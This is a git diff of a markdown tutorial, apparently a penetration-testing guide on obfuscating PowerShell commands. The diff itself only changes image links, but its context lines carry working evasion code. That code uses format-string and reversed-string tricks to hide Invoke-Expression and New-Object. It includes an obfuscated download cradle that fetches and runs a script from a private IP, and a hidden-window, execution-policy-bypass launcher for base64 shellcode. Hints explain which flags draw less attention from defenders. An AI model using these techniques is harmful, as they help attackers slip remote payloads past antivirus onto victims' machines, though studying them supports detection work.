@@ -563,7 +563,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
       IEX (-Join[RegEx]::Matches($reverseCmd,'.','RightToLeft')) | IEX
 
 
-![powershell obfuscation](http://i.cubeupload.com/yukEB8.jpg)
+![powershell obfuscation](http://i67.tinypic.com/2labt3d.jpg)
 
 ---
 
@@ -581,7 +581,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 - String obfuscated<br />
 `("{0}{2}{1}{3}" -f'vice','Ser','G','et-')` And `$first='Te'+'amV'+'iewer'`
 
-![powershell obfuscation](http://i.cubeupload.com/1hy2GA.jpg)
+![powershell obfuscation](http://i66.tinypic.com/21eublh.jpg)
 
       Stacking 're-order' commands together with the ; operator. Remmenber that we can also
      store the re-order method inside an local variable to be called at run-time.
@@ -593,7 +593,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 - String obfuscated<br />
 `$a=("{3}{0}{2}{1}{4}" -f'voke','es','-Expr','In','sion') ; $r=("{0}{2}{1}" -f'(New','ject)','-Ob')`
 
-![powershell obfuscation](http://i.cubeupload.com/1QWXPY.jpg)
+![powershell obfuscation](http://i67.tinypic.com/1znx11e.jpg)
 `HINT: we can also scramble the location of the vars ($a | $r) inside the sourcecode (order)`<br />
 `to obfuscate it further, and then call them in the correct order executing the powershell command.`
 
@@ -608,7 +608,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
       I`E`X ('({0}w-Object {0}t.WebClient).{1}String("{2}19`2.16`8.1`.71/He`ll`o.ps`1")' -f'Ne','Download','http://')
 
-![powershell obfuscation](http://i.cubeupload.com/p9j54c.jpg)
+![powershell obfuscation](http://i65.tinypic.com/2h55mb4.jpg)
 
 ---
 
@@ -626,7 +626,7 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
       $syscall=("{1}{0}" -f'N','-Wi'); $flag=("{1}{0}{2}" -f'Id','h','DEn'); $cert=("{1}{0}" -f'p','-E'); $pem=("{1}{2}{0}" -f'SS','by','pA'); powershell -C "set-variable -name "C" -value "-"; set-variable -name "s" -value "e"; set-variable -name "q" -value "n"; set-variable -name "P" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell $syscall $flag $cert $pem (get-variable P).value.toString() ENCODED-BASE64-SHELLCODE"
 
-![powershell obfuscation](http://i.cubeupload.com/kD8nqd.png)
+![powershell obfuscation](http://i66.tinypic.com/kdabsh.png)
 
       HINT: I have re-written REL1K's template to accept -WiN hIdDEn -Ep bYpASS (reorder obfuscation)
       and change the powershell 'EncodingCommand' from -ec to -en (less used flag by pentesters).
